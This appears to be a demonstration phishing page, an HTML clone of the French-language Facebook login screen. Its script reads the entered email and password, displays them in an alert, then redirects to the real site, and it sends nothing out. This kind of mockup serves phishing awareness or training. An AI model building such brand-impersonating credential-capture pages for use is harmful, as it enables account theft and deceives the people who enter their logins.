
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Facebook – Se connecter</title>
  <style>
    body {
      background-color: #f0f2f5;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
    }

    .logo {
      color: #1877f2;
      font-size: 48px;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .login-box {
      background-color: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      width: 350px;
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ddd;
      border-radius: 6px;
    }

    .login-box button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      background-color: #1877f2;
      color: white;
      border: none;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
    }

    .login-box .create-account {
      background-color: #42b72a;
      margin-top: 15px;
    }

    .login-box a {
      font-size: 14px;
      display: block;
      margin-top: 10px;
      color: #1877f2;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="logo">facebook</h1>
    <div class="login-box">
      <form id="fakeLoginForm">
        <input type="text" id="email" placeholder="Adresse e-mail ou téléphone" required>
        <input type="password" id="password" placeholder="Mot de passe" required>
        <button type="submit">Se connecter</button>
        <a href="#">Mot de passe oublié ?</a>
        <hr>
        <button type="button" class="create-account">Créer un compte</button>
      </form>
    </div>
  </div>

  <script>
    document.getElementById('fakeLoginForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      alert("Identifiants saisis :\nEmail : " + email + "\nMot de passe : " + password);
      setTimeout(() => {
        window.location.href = "https://www.facebook.com/";
      }, 1000);
    });
  </script>
</body>
</html>
